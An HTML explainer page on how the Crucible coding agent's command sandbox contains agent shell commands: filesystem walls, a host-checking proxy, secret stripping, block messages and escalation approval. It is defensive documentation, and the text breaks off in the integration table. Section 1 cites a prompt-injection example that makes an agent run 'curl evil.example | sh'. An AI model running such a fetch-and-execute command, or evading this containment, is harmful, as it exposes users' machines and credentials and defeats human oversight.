@@ -1,0 +1,416 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>How Crucible's Command Sandbox Works</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Newsreader:opsz,wght@6..72,500;6..72,600&family=Public+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap">
+<style>
+/* Layout: one reading column; two speaker voices as marked asides; code paths in mono chips. */
+:root {
+  --bg: #f5f6f4;
+  --surface: #ffffff;
+  --fg: #18211f;
+  --muted: #56625e;
+  --line: #d9dfdc;
+  --accent: #0e6e63;
+  --accent-soft: #e2f1ee;
+  --prof: #4a4fb0;
+  --prof-soft: #ecedfa;
+  --eng: #9a5b10;
+  --eng-soft: #fbf1e3;
+  --code-bg: #eef1ef;
+  --font-display: "Newsreader", Georgia, "Times New Roman", serif;
+  --font-body: "Public Sans", system-ui, -apple-system, "Segoe UI", sans-serif;
+  --font-mono: "JetBrains Mono", ui-monospace, "SF Mono", Menlo, monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #111615; --surface: #181f1d; --fg: #dde6e2; --muted: #9aa8a3; --line: #2b3633;
+    --accent: #4fd1bd; --accent-soft: #15302b; --prof: #a3a8ff; --prof-soft: #1f2140;
+    --eng: #f0b35e; --eng-soft: #2e2414; --code-bg: #1d2523; color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #111615; --surface: #181f1d; --fg: #dde6e2; --muted: #9aa8a3; --line: #2b3633;
+  --accent: #4fd1bd; --accent-soft: #15302b; --prof: #a3a8ff; --prof-soft: #1f2140;
+  --eng: #f0b35e; --eng-soft: #2e2414; --code-bg: #1d2523; color-scheme: dark;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg); color: var(--fg); font-family: var(--font-body);
+  font-size: 16px; line-height: 1.65; margin: 0;
+  padding-left: max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+  padding-block: 40px 80px;
+}
+main { max-width: 760px; margin: 0 auto; display: flex; flex-direction: column; gap: 22px; }
+header.hero { display: flex; flex-direction: column; gap: 10px; padding-bottom: 8px; border-bottom: 1px solid var(--line); }
+.eyebrow { font-size: 12px; letter-spacing: .08em; text-transform: uppercase; color: var(--accent); font-weight: 600; }
+h1, h2, h3 { font-family: var(--font-display); font-weight: 600; text-wrap: balance; line-height: 1.2; margin: 0; }
+h1 { font-size: clamp(30px, 6vw, 42px); }
+h2 { font-size: 27px; margin-top: 26px; }
+h3 { font-size: 20px; margin-top: 10px; }
+p, ul, ol { margin: 0; }
+ul, ol { padding-left: 22px; display: flex; flex-direction: column; gap: 6px; }
+.lede { font-size: 18px; color: var(--muted); max-width: 62ch; }
+code, .path { font-family: var(--font-mono); font-size: .86em; background: var(--code-bg); padding: 1px 5px; border-radius: 4px; overflow-wrap: anywhere; }
+pre { font-family: var(--font-mono); font-size: 13px; line-height: 1.55; background: var(--code-bg); border: 1px solid var(--line); border-radius: 8px; padding: 14px 16px; overflow-x: auto; margin: 0; }
+pre code { background: none; padding: 0; font-size: inherit; }
+a { color: var(--accent); }
+a:focus-visible, summary:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 3px; }
+.voice { border-radius: 10px; padding: 14px 16px; display: flex; flex-direction: column; gap: 8px; border: 1px solid var(--line); }
+.voice .who { font-size: 12px; font-weight: 700; letter-spacing: .07em; text-transform: uppercase; }
+.voice.prof { background: var(--prof-soft); border-color: color-mix(in srgb, var(--prof) 30%, transparent); }
+.voice.prof .who { color: var(--prof); }
+.voice.eng { background: var(--eng-soft); border-color: color-mix(in srgb, var(--eng) 30%, transparent); }
+.voice.eng .who { color: var(--eng); }
+nav.toc { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 14px 18px; }
+nav.toc ol { font-size: 15px; }
+.table-wrap { overflow-x: auto; border: 1px solid var(--line); border-radius: 10px; background: var(--surface); }
+table { border-collapse: collapse; width: 100%; font-size: 14px; min-width: 560px; }
+th, td { text-align: left; padding: 9px 12px; border-bottom: 1px solid var(--line); vertical-align: top; }
+th { font-weight: 600; font-size: 12px; letter-spacing: .05em; text-transform: uppercase; color: var(--muted); background: var(--code-bg); }
+tr:last-child td { border-bottom: none; }
+td code { white-space: nowrap; }
+.layers { display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); gap: 12px; }
+.layer { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; display: flex; flex-direction: column; gap: 6px; min-width: 0; }
+.layer .file { font-family: var(--font-mono); font-size: 12.5px; color: var(--accent); overflow-wrap: anywhere; }
+.layer p { font-size: 14.5px; color: var(--muted); }
+.diagram { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 12px; overflow-x: auto; }
+details { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 10px 14px; }
+details summary { cursor: pointer; font-weight: 600; }
+details[open] summary { margin-bottom: 8px; }
+.quiz { display: flex; flex-direction: column; gap: 10px; }
+.note { font-size: 14px; color: var(--muted); }
+footer { margin-top: 20px; padding-top: 14px; border-top: 1px solid var(--line); font-size: 13px; color: var(--muted); }
+@media (prefers-reduced-motion: reduce) { * { scroll-behavior: auto !important; } }
+</style>
+</head>
+<body>
+
+<main>
+<header class="hero">
+  <div class="eyebrow">Crucible internals · a guided reading</div>
+  <h1>How Crucible's command sandbox works</h1>
+  <p class="lede">The code in <code>services/agentd-py/agentd/sandbox/</code>, read the way a professor and a senior engineer would walk you through it: what each part does, why it was built that way, and every place the rest of the repository calls into it.</p>
+</header>
+
+<nav class="toc" aria-label="Contents">
+  <ol>
+    <li><a href="#problem">The problem the sandbox solves</a></li>
+    <li><a href="#model">The mental model: six small modules</a></li>
+    <li><a href="#journey">One command's journey, call by call</a></li>
+    <li><a href="#policy">The policy: what a command may touch</a></li>
+    <li><a href="#walls">Building the wall on macOS and Linux</a></li>
+    <li><a href="#network">The only way out: the proxy</a></li>
+    <li><a href="#blocks">Telling the agent it was blocked</a></li>
+    <li><a href="#escalation">Asking to go past the wall</a></li>
+    <li><a href="#modes">How it combines with the approval modes</a></li>
+    <li><a href="#integration">Integration map: every call site</a></li>
+    <li><a href="#limits">What it does not cover</a></li>
+    <li><a href="#quiz">Check yourself</a></li>
+  </ol>
+</nav>
+
+<h2 id="problem">1. The problem the sandbox solves</h2>
+<p>Crucible's agent runs shell commands on your computer through two tools: <code>run_command</code> (one command, wait for it) and <code>start_session</code> (a long-running terminal). Before the sandbox, the only protection was the approval card: you read a command and decided. That works until you click Allow on something that looks harmless, or until a prompt injection hidden in a README convinces the agent to run <code>curl evil.example | sh</code> in Full access.</p>
+
+<div class="voice prof">
+  <div class="who">Professor</div>
+  <p>Separate two questions that people blur together. <em>Should this command run?</em> is a judgment, and judgments can be wrong. <em>What can this command touch if it does run?</em> is a fact the operating system can enforce. Approval answers the first question. The sandbox answers the second, so a wrong judgment has a bounded cost.</p>
+</div>
+
+<p>So the sandbox puts every agent command inside an operating-system wall. Inside the wall a command can:</p>
+<ul>
+  <li><strong>write</strong> only the workspace, temp folders, package caches and folders you added;</li>
+  <li><strong>not read</strong> credential stores such as <code>~/.ssh</code>, <code>~/.aws</code> or the Keychain;</li>
+  <li><strong>reach the network</strong> only through one proxy, which allows package registries, GitHub and hosts you approved.</li>
+</ul>
+<p>It is on by default in every approval mode, Full access included. If the agent needs more, it must ask explicitly, with a reason, and that request is approved like any other.</p>
+
+<h2 id="model">2. The mental model: six small modules</h2>
+<p>The package is about 1,350 lines. Read it as layers, each with one job:</p>
+<div class="layers">
+  <div class="layer"><div class="file">policy.py</div><h3>What</h3><p>A plain data description of what one command may write, may not write and may not read. Knows nothing about operating systems.</p></div>
+  <div class="layer"><div class="file">seatbelt.py · bubblewrap.py</div><h3>How</h3><p>Turn that description into OS rules: a Seatbelt profile on macOS, bubblewrap mount arguments on Linux.</p></div>
+  <div class="layer"><div class="file">runtime.py · launch.py</div><h3>When</h3><p>Whether the sandbox is on and works on this machine, and the bundle one command needs: policy, wrapped command line, environment, proxy lease.</p></div>
+  <div class="layer"><div class="file">env.py</div><h3>Environment</h3><p>The command's environment variables, minus anything that looks like a secret, plus the proxy settings.</p></div>
+  <div class="layer"><div class="file">proxy.py · netbridge.py · hosts.py</div><h3>Network</h3><p>The single route out: an HTTP proxy that checks host names, and a small bridge that carries it into a Linux network namespace.</p></div>
+  <div class="layer"><div class="file">blocks.py · escalation.py · store.py</div><h3>Feedback</h3><p>Recognize when the wall stopped a command and say so, let the agent ask to go past it, and remember the hosts and folders you approved.</p></div>
+</div>
+
+<div class="voice eng">
+  <div class="who">Senior engineer</div>
+  <p>Notice that <code>policy.py</code> is pure data and both renderers consume it. That is the design choice that keeps macOS and Linux in agreement. When you add a protected path, you add it once in the policy; you never edit two OS-specific rule lists and hope they match.</p>
+</div>
+
+<h2 id="journey">3. One command's journey, call by call</h2>
+<p>Follow <code>npm install</code> from the moment the agent asks for it. Every name below is a real function in the repository.</p>
+<div class="diagram">
+<pre class="mermaid">
+sequenceDiagram
+    autonumber
+    participant Loop as ControllerLoop
+    participant Reg as ToolRegistry.prepare_command
+    participant Ctl as ChatController (approval)
+    participant RT as SandboxRuntime.launch_for
+    participant Sh as tools/shell.run_command
+    participant OS as sandbox-exec / bwrap
+    participant Px as SandboxProxy
+    Loop->>Reg: run_command {command, args}
+    Reg->>Reg: escalation_from_args(args) → None
+    Reg->>Ctl: _command_approval_cb (Ask / Auto / Full access)
+    Ctl-->>Reg: ApprovalOutcome(approved)
+    Reg->>RT: launch_for(shadow_root, extra_hosts)
+    RT->>Px: lease(remembered hosts, extras)
+    RT->>RT: build_policy(...)
+    RT-->>Reg: SandboxLaunch(policy, lease, tmpdir)
+    Reg->>Sh: run_command(..., sandbox=launch)
+    Sh->>OS: launch.wrap(["/bin/sh","-c", line]) + launch.env(env)
+    OS->>Px: HTTPS via HTTPS_PROXY (token in URL)
+    Px-->>OS: allowed host → tunnel / other → 403
+    Sh-->>Reg: ToolOutput(exit_code, output)
+    Reg->>Px: launch.release() (closes the lease)
+    Reg->>Reg: annotate_block(output, launch, "run_command")
+    Reg-->>Loop: ToolOutput (status, outside_sandbox)
+    Loop->>Loop: sandbox_marker(out) → pill "blocked"/"outside"/none
+</pre>
+</div>
+
+<p>In words:</p>
+<ol>
+  <li><strong>The gate first.</strong> <code>ToolRegistry.prepare_command</code> (<span class="path">agentd/tools/registry.py</span>) checks whether the agent asked to go past the wall (<code>escalation_from_args</code>). If not, it calls the ordinary command approval: Ask shows a card, Auto may ask the judge, Full access approves.</li>
+  <li><strong>Then a launch.</strong> Inside the returned <code>run()</code> it calls <code>SandboxRuntime.launch_for(shadow_root=…, extra_hosts=…)</code> (<span class="path">agentd/sandbox/runtime.py</span>). That returns <code>None</code> when the sandbox is off or unavailable, and otherwise a <code>SandboxLaunch</code>: a fresh policy, a proxy lease and a private temp folder.</li>
+  <li><strong>The spawn.</strong> <code>run_command</code> (<span class="path">agentd/tools/shell.py</span>) builds the same shell line as always, then runs <code>sandbox.wrap(["/bin/sh", "-c", line])</code> with <code>sandbox.env(env)</code> through <code>asyncio.create_subprocess_exec</code>. Without a launch it uses the old unsandboxed path.</li>
+  <li><strong>Cleanup and labelling.</strong> In a <code>finally</code>, <code>launch.release()</code> closes the lease so its token stops working. Then <code>annotate_block</code> checks whether the wall stopped the command, and <code>sandbox_marker</code> turns that into the tool pill's label.</li>
+</ol>
+
+<div class="voice prof">
+  <div class="who">Professor</div>
+  <p>Notice where the policy is built: per command, at launch time, not once at startup. The remembered hosts and extra folders can change between two commands, and a command started later should see the newer settings. Fresh construction makes that automatic, with no cache to invalidate.</p>
+</div>
+
+<h2 id="policy">4. The policy: what a command may touch</h2>
+<p><code>build_policy()</code> in <span class="path">agentd/sandbox/policy.py</span> returns a frozen <code>SandboxPolicy</code>. Its fields are the whole vocabulary of the sandbox:</p>
+<div class="table-wrap"><table>
+  <thead><tr><th>Field</th><th>What goes in it</th><th>Why</th></tr></thead>
+  <tbody>
+    <tr><td><code>writable</code></td><td>The workspace, <code>/tmp</code> and <code>$TMPDIR</code>, package caches (<code>~/.npm</code>, <code>~/.cache</code>, <code>~/.cargo/registry</code>, …), the extra folders from Settings, and the task shadow</td><td>Builds and installs must work. The caches' <code>bin</code> folders are deliberately absent: they are on <code>PATH</code>, so a command could plant a program you run later.</td></tr>
+    <tr><td><code>read_only</code></td><td>Auto's always-ask list (<code>AGENTS.md</code>, <code>.crucible/approved-*.json</code>, <code>mcp.json</code>, <code>.vscode</code> settings, <code>.git/hooks</code>, …), shell startup files, and <code>.git</code></td><td>These files grant permissions or steer the agent. A command must not be able to edit its own permissions.</td></tr>
+    <tr><td><code>unreadable</code></td><td><code>~/.ssh</code>, <code>~/.aws</code>, <code>~/.gnupg</code>, <code>~/.config/gh</code>, <code>~/.crucible/auth</code>, the Keychain folder, shell history, …</td><td>Credential stores. Reading them is how a token leaves the machine.</td></tr>
+    <tr><td><code>pinned</code></td><td>Every parent folder of a protected path</td><td>See the engineer's note below.</td></tr>
+    <tr><td><code>git_dir</code>, <code>git_common_dir</code></td><td>The real git directories, which differ in a linked worktree (<code>_git_dirs</code>)</td><td>So the git allowlist applies to the right folders.</td></tr>
+    <tr><td><code>private_tmp</code></td><td>This workspace's own temp folder</td><td>The shared temp folders hold the host's sockets: VS Code's, tmux's, ssh-agent's.</td></tr>
+  </tbody>
+</table></div>
+
+<div class="voice eng">
+  <div class="who">Senior engineer</div>
+  <p><strong>Why pin the parents?</strong> Making <code>.vscode/settings.json</code> read-only is not enough if the command can run <code>mv .vscode x; mkdir .vscode; write a new settings.json</code>. The file was never written; its folder was replaced. So <code>_pinned()</code> collects every ancestor of every protected path, and the renderers forbid renaming or replacing those exact paths. A final review found this hole; it is the kind of bug a list of "bad files" never catches.</p>
+  <p><strong>Why is <code>.git</code> an allowlist?</strong> Git run outside the sandbox (VS Code runs it constantly, without asking) executes <code>hooks/</code>, follows <code>core.fsmonitor</code> in <code>config</code>, and follows <code>commondir</code>. Any new control file git learns about tomorrow is another way out. So the policy lists what everyday git may write (<code>GIT_WORKTREE_DIRS</code>, <code>GIT_WORKTREE_FILES</code>, <code>GIT_SHARED_DIRS</code>, <code>GIT_SHARED_FILES</code>) and blocks everything else. Rebase and bisect state are absent on purpose: a rebase todo file holds <code>exec</code> lines that git runs on <code>--continue</code>, outside the wall.</p>
+</div>
+
+<h2 id="walls">5. Building the wall on macOS and Linux</h2>
+<p>The two renderers share one idea, which is worth learning as a general principle: <strong>later rules win</strong>. You start broad and carve exceptions, then exceptions to the exceptions.</p>
+
+<h3>macOS: a Seatbelt profile (<span class="path">seatbelt.py</span>)</h3>
+<p><code>seatbelt_profile(policy)</code> writes a profile in Apple's sandbox language, and <code>seatbelt_argv</code> runs the command as <code>/usr/bin/sandbox-exec -p &lt;profile&gt; -- /bin/sh -c "…"</code>. The rules are emitted in this order:</p>
+<ol>
+  <li><code>_BASE</code>: deny everything, then allow processes, reading files, terminals and the standard devices. Network is allowed only to <code>localhost</code>, which is where the proxy listens.</li>
+  <li><code>_KEYCHAIN</code> and <code>_CLIPBOARD</code>: deny the Mach services behind the Keychain and the clipboard, since both hold the same secrets the file rules protect.</li>
+  <li>Allow writes to <code>writable</code>; allow Unix sockets only in the workspace and the private temp folder.</li>
+  <li>Deny writes to <code>read_only</code>, then re-allow any writable path nested inside one (the task shadow lives under the read-only <code>.crucible/state</code>).</li>
+  <li><code>_git_rules</code>: re-allow git's everyday files by regex; deny object alternates.</li>
+  <li>Deny writes to each <code>pinned</code> path exactly (<code>literal</code>, not <code>subpath</code>).</li>
+  <li>Last, deny reading and writing <code>unreadable</code>. Last, so that a workspace containing your home folder cannot re-open <code>~/.ssh</code>.</li>
+</ol>
+
+<h3>Linux: bubblewrap mounts (<span class="path">bubblewrap.py</span>)</h3>
+<p><code>bwrap_argv</code> builds the same picture out of mounts: the whole filesystem read-only (<code>--ro-bind / /</code>), writable roots bound back read-write, protected paths bound read-only over them, credential folders hidden behind empty mounts. <code>--unshare-net</code> gives the command a network with only loopback, and <code>/run</code> and <code>/var/run</code> are hidden, because a new network namespace does not stop a command from opening a Unix socket by path (the Docker socket lives there).</p>
+
+<div class="voice eng">
+  <div class="who">Senior engineer</div>
+  <p>Linux is stricter in two places, and you should know why before someone files them as bugs. Bubblewrap can only mount over paths that exist, and it cannot say "this file but not that one". So <code>.crucible</code>, <code>.claude</code>, <code>.vscode</code> and <code>.git</code> are read-only as whole folders (<code>_control_folder_args</code>), with only git's <code>objects</code>, <code>refs</code>, <code>logs</code> and <code>FETCH_HEAD</code> bound back. Result: <code>git status</code> and <code>git fetch</code> work, but <code>git add</code> and <code>git commit</code> need an escalation. Codex behaves the same way.</p>
+</div>
+
+<h3>Is the sandbox even possible here? (<span class="path">runtime.py</span>)</h3>
+<p>At startup, <code>main.py</code> runs <code>SandboxRuntime.start()</code> in the background. It clears the private temp folder, then <code>_probe()</code> runs <code>/usr/bin/true</code> inside an empty wall. Exit 0 means available. Otherwise it records a reason the UI can show: "bubblewrap is not installed", "user namespaces are disabled", or "native Windows is not supported". Then it starts the proxy. <code>active()</code> is simply <code>enabled and available</code>; while the probe is still running, <code>status()</code> reports <code>available: false</code> with <code>reason: null</code>, which clients read as "still checking".</p>
+
+<h2 id="network">6. The only way out: the proxy</h2>
+<p>A sandboxed command has no route to the internet except one HTTP proxy inside the backend process (<code>SandboxProxy</code> in <span class="path">proxy.py</span>). <code>sandbox_env()</code> points <code>HTTP_PROXY</code>, <code>HTTPS_PROXY</code> and <code>ALL_PROXY</code> at it, and sets <code>NODE_USE_ENV_PROXY=1</code> because Node's built-in <code>fetch</code> ignores those variables otherwise.</p>
+
+<h3>Leases: knowing which command is asking</h3>
+<p>Each launch gets a <code>ProxyLease</code> from <code>proxy.lease()</code> with a random 32-hex-digit token. The token rides in the proxy URL as a username: <code>http://&lt;token&gt;:x@127.0.0.1:&lt;port&gt;</code>. Tools send it back as a <code>Proxy-Authorization</code> header, and <code>_lease_for()</code> finds the lease. That lets the proxy:</p>
+<ul>
+  <li>apply that command's extra hosts (from an approved <code>allow_hosts</code>) without granting them to anyone else;</li>
+  <li>record the hosts it refused on that lease, which <code>annotate_block</code> reads later;</li>
+  <li>cut off a command that has finished: <code>release()</code> drops the lease and closes its open connections.</li>
+</ul>
+
+<h3>The decision, in <code>_check()</code></h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>Situation</th><th>Answer</th><th>Recorded as a block?</th></tr></thead>
+  <tbody>
+    <tr><td>Host in <code>DEFAULT_HOSTS</code>, remembered for the workspace, or in the lease's extras</td><td>Tunnel (<code>200 Connection Established</code>)</td><td>No</td></tr>
+    <tr><td>Any other host</td><td><code>403 Forbidden</code></td><td>Yes</td></tr>
+    <tr><td>Allowed name that resolves only to internal addresses (loopback, link-local, cloud metadata <code>169.254.169.254</code>), not explicitly listed</td><td><code>403</code></td><td>Yes</td></tr>
+    <tr><td>Allowed host that doesn't resolve, or can't be reached</td><td><code>502 Bad Gateway</code></td><td>No: a DNS failure is never reported as the sandbox</td></tr>
+    <tr><td>Wrong or released token</td><td><code>407</code></td><td>No</td></tr>
+    <tr><td>No token at all</td><td>The baseline only: defaults and remembered hosts</td><td>Yes, if refused</td></tr>
+  </tbody>
+</table></div>
+
+<div class="voice eng">
+  <div class="who">Senior engineer</div>
+  <p>Three details came from real failures, not theory:</p>
+  <ul>
+    <li><strong>The token-less baseline.</strong> Ubuntu's npm 9 silently drops credentials from a proxy URL, so every install failed with 407. A request with no token now gets exactly what every sandboxed command already has, so it gains nothing.</li>
+    <li><strong>The host is rewritten.</strong> For plain HTTP, <code>_forward_request</code> sends the checked host upstream and drops the client's <code>Host</code> header. On a CDN, a different <code>Host</code> header would reach another tenant through an allowed name. It also forces <code>Connection: close</code>, so a second request on the same connection can't slip past the check.</li>
+    <li><strong>Connect to the address you checked.</strong> The proxy resolves the name, checks the addresses, and connects to those addresses. A second DNS answer can't redirect it to an internal address after the check.</li>
+  </ul>
+  <p>TLS is tunnelled, never inspected. The proxy sees host names, not contents.</p>
+</div>
+
+<h3>Linux needs a bridge (<span class="path">netbridge.py</span>)</h3>
+<p>Inside <code>--unshare-net</code> there is only loopback, so the proxy outside is unreachable over TCP. On Linux the proxy also listens on a Unix socket, which bubblewrap binds into the sandbox. <code>netbridge.py</code>, a standard-library-only script, starts first inside the namespace, listens on <code>127.0.0.1:&lt;port&gt;</code>, forwards each connection to that socket, then runs the real command as its child and exits with its status. The command never knows: its <code>HTTPS_PROXY</code> points at <code>127.0.0.1:&lt;port&gt;</code> on both platforms.</p>
+
+<h3>The environment (<span class="path">env.py</span>)</h3>
+<p>Blocking <code>~/.aws</code> would be pointless if <code>AWS_SECRET_ACCESS_KEY</code> rode in on the environment. <code>sandbox_env()</code> drops any variable whose name contains <code>KEY</code>, <code>SECRET</code>, <code>TOKEN</code>, <code>PASSWORD</code>, <code>AUTH</code> and similar markers (but not git's <code>AUTHOR</code> variables), plus any URL value that contains a password, such as <code>DATABASE_URL=postgres://u:pw@…</code>. A command allowed outside the sandbox gets the full environment back.</p>
+<div class="voice eng">
+  <div class="who">Senior engineer</div>
+  <p>One gotcha you will meet: on macOS, <code>env.py</code> also removes <code>NODE_USE_SYSTEM_CA</code> and <code>--use-system-ca</code>. With those set, Node reads system certificates from the Keychain; the sandbox denies the Keychain; Node segfaults. It showed up as <code>npm install</code> exiting with code 139. The Keychain deny stays, because credential helpers reach your tokens through the same service.</p>
+</div>
+
+<h2 id="blocks">7. Telling the agent it was blocked</h2>
+<p>A blocked command fails like any other: <code>Operation not permitted</code>, <code>Read-only file system</code>, a 403 from the proxy. An agent that doesn't know why will retry, or work around it in ways you won't like. So <code>annotate_block()</code> (<span class="path">blocks.py</span>) runs after every sandboxed command and, when the wall caused the failure, prepends a sentence such as:</p>
+<pre><code>Blocked by the sandbox: network access to example.com is not allowed.
+To allow this host, call run_command again with allow_hosts: ["example.com"] and a short reason.</code></pre>
+<p>It also sets <code>output.status = "sandbox_blocked"</code>, which <code>sandbox_marker()</code> turns into the pill's "blocked" label. The detection in <code>classify_block()</code> is deliberately narrow:</p>
+<ul>
+  <li><strong>A refused host always counts</strong>, even when the command exited 0: <code>curl http://x</code> exits 0 after receiving the proxy's 403.</li>
+  <li><strong>A denied write to a protected file always counts</strong>: <code>git checkout</code> can exit 0 and leave a protected file stale.</li>
+  <li><strong>Anything else counts only when the command failed</strong>: a passing <code>grep</code> or test run can print the same words about something unrelated.</li>
+  <li><strong>"Permission denied" (EACCES) is never a block.</strong> That is ordinary file permissions. The sandbox produces EPERM or EROFS, and only on paths outside the allowed set.</li>
+  <li>A <strong>direct network attempt</strong> also counts, including name-resolution failures: only the proxy can resolve names inside the wall, so an SSH <code>git push</code> fails there.</li>
+</ul>
+<div class="voice prof">
+  <div class="who">Professor</div>
+  <p>This is a classifier, and like every classifier it trades false positives for false negatives. The rule here is asymmetric on purpose: mislabelling an ordinary error as "the sandbox blocked you" invites the agent to escalate for no reason, which is worse than occasionally missing a block. That is why the exit code decides so much.</p>
+</div>
+
+<h2 id="escalation">8. Asking to go past the wall</h2>
+<p>While the sandbox is active, the schemas of <code>run_command</code> and <code>start_session</code> gain three arguments from <code>ESCALATION_PROPERTIES</code> (<span class="path">escalation.py</span>): <code>allow_hosts</code>, <code>outside_sandbox</code> and <code>reason</code>. When the sandbox is off they aren't in the schema at all, so the agent can't ask for something that means nothing.</p>
+<p><code>escalation_from_args()</code> turns them into an <code>Escalation</code>. In <code>prepare_command</code>, an escalation <em>replaces</em> the ordinary approval: it goes to <code>escalation_approval_callback</code>, which is <code>ChatController._escalation_approval_cb</code> (<span class="path">agentd/chat/controller.py</span>). No remembered command rule ever covers it. If no callback is wired, the request is refused, never allowed.</p>
+<ul>
+  <li><strong><code>allow_hosts</code></strong> runs <em>inside</em> the wall with those hosts added to this command's lease (<code>launch_for(extra_hosts=…)</code>).</li>
+  <li><strong><code>outside_sandbox</code></strong> runs with no launch at all, so the command is unsandboxed and gets the full environment back. The result carries <code>outside_sandbox = True</code>, and the pill shows "outside".</li>
+</ul>
+<p>The card is <code>SandboxEscalationGate</code> in <span class="path">webview-ui/…/gates/CommandGate.tsx</span>. Its "Allow for this workspace" button sends <code>remember: true</code>; in <code>_ask_command</code> that saves the hosts with <code>store.add_host()</code>, and only for <code>allow_hosts</code>. Leaving the sandbox entirely is never remembered.</p>
+
+<div class="voice eng">
+  <div class="who">Senior engineer</div>
+  <p>Where are remembered hosts kept? In <code>~/.crucible/sandbox/&lt;first 16 hex digits of sha256(workspace path)&gt;/hosts.json</code>, next to <code>folders.json</code> (<code>WorkspaceSandboxStore</code>, <span class="path">store.py</span>). Never in the repository. If they lived in <code>.crucible/</code>, a cloned repository could ship its own allowlist, and a command could widen its own wall.</p>
+</div>
+
+<h2 id="modes">9. How it combines with the approval modes</h2>
+<p>The sandbox decides <em>what a command can touch</em>; the mode decides <em>who approves it</em>. The two are independent, and their combination is the actual behavior:</p>
+<div class="table-wrap"><table>
+  <thead><tr><th>Mode</th><th>Ordinary command (sandbox on)</th><th>Escalation (allow_hosts / outside_sandbox)</th></tr></thead>
+  <tbody>
+    <tr><td>Ask for approval</td><td>Card, unless a remembered rule covers it</td><td>Escalation card for you</td></tr>
+    <tr><td>Accept edits</td><td>Card, unless a remembered rule covers it</td><td>Escalation card for you</td></tr>
+    <tr><td>Auto</td><td><code>AutoGate.decide_command(sandboxed=True)</code>: deny list, then protected writes ask, then remembered rules, then <strong>runs without the judge unless <code>is_outward()</code></strong> (pushes, publishing, <code>gh</code> writes)</td><td><code>AutoGate.decide_escalation</code>: deny list, protected writes ask, then the judge decides</td></tr>
+    <tr><td>Full access</td><td>Runs, inside the wall</td><td>Runs without asking: when a command is blocked, the agent's retry with the escalation goes straight through</td></tr>
+  </tbody>
+</table></div>
+<div class="voice prof">
+  <div class="who">Professor</div>
+  <p>Look at the Auto row. Without the sandbox, Auto has to judge almost every command, because a test run executes workspace code that an injected edit may have changed. With the sandbox, the wall already contains that code, so only actions that reach <em>outward</em> through an allowed host still need judgment. That is the same split Codex and Claude Code use. The sandbox made Auto both cheaper and safer at once.</p>
+</div>
+<p>One more interaction: typing into a terminal session. In Ask and Accept edits, input to a session that was let <em>out</em> of the sandbox asks each time (control keys pass), so "Allow once" can't become a standing unsandboxed shell. The check is in <code>ChatController._stdin_approval_cb</code>, using <code>SessionManager.session_sandbox()</code>: a session keeps the wall it started in, even if you flip the switch later.</p>
+
+<h2 id="integration">10. Integration map: every call site</h2>
+<p>This is where the rest of the repository touches the sandbox, from startup to the screen. File paths are relative to the repository root.</p>
+<div class="table-wrap"><table>
+  <thead><tr><th>Where</th><th>Function</th><th>What it does with the sandbox</th></tr></thead>
+  <tbody>
+    <tr><td><span class="path">agentd/chat/controller_factory.py</span></td><td><code>select_chat_handler</code></td><td>Builds <code>SandboxRuntime(workspace_path)</code> and passes it to <code>ChatController</code>. One backend serves one workspace, so one runtime.</td></tr>
+    <tr><td><span class="path">agentd/main.py</span></td><td><code>_start_sandbox</code> (startup hook)</td><td>Runs <code>runtime.start()</code> in the background (probe, then proxy), so <code>/health</code> isn't delayed; registers <code>close</code> on shutdown; mounts <code>build_sandbox_router</code>.</td></tr>
+    <tr><td><span class="path">agentd/api/sandbox_routes.py</span></td><td><code>build_sandbox_router</code></td><td><code>GET /v1/sandbox</code>, <code>PUT /v1/sandbox/hosts</code>, <code>PUT /v1/sandbox/folders</code> for Settings › Sandbox (422 on a bad value).</td></tr>
+    <tr><td><span class="path">agentd/api/routes.py</span></td><td><code>PUT /v1/chat/approval-mode</code></td><td>Passes the <code>sandbox</code> field to <code>ChatController.set_approval_mode</code>, which flips <code>runtime.enabled</code>. Applies from the next command.</td></tr>
+    <tr><td><span class="path">agentd/chat/controller.py</span></td><td><code>_build_registry</code>, <code>_run_loop</code></td><td>Hand the runtime and the escalation callback to <code>BuiltinToolSource</code> → <code>ToolRegistry</code> (in <code>_build_registry</code>) and to <code>ExecSessionToolSource</code> (in <code>_run_loop</code>). Sub-agents and team members get it the same way.</td></tr>
+    <tr><td><span class="path">agentd/tools/registry.py</span></td><td><code>prepare_command</code></td><td>Escalation or ordinary approval, then <code>launch_for</code> → <code>run_command</code> → <code>release</code> → <code>annotate_block</code>.</td></tr>
+    <tr><td><span class="path">agentd/tools/shell.py</span></td><td><code>run_command</code></td><td>Spawns <code>sandbox.wrap(["/bin/sh","-c", line])</code> with <code>sandbox.env(env)</code>; marks <code>ToolOutput.sandboxed</code>.</td></tr>
+    <tr><td><span class="path">agentd/exec_sessions/tool_source.py</span></td><td><code>ExecSessionToolSource._start</code>, <code>_annotate</code></td><td>Same steps for <code>start_session</code>; annotates only output new since the last read, and only hosts refused since then.</td></tr>
+    <tr><td><span class="path">agentd/exec_sessions/manager.py</span></td><td><code>SessionManager.start</code></td><td>Wraps the PTY command with <code>interactive=True</code> (keeps the controlling terminal so Ctrl-C works); releases the lease when the session ends.</td></tr>
+    <tr><td><span class="path">agentd/approvals/auto_gate.py</span></td><td><code>decide_command</code>, <code>decide_escalation</code>, <code>decide_stdin</code></td><td>Auto's sandbox-aware decisions; <code>is_outward()</code> lives in <span class="path">auto_rules.py</span>.</td></tr>
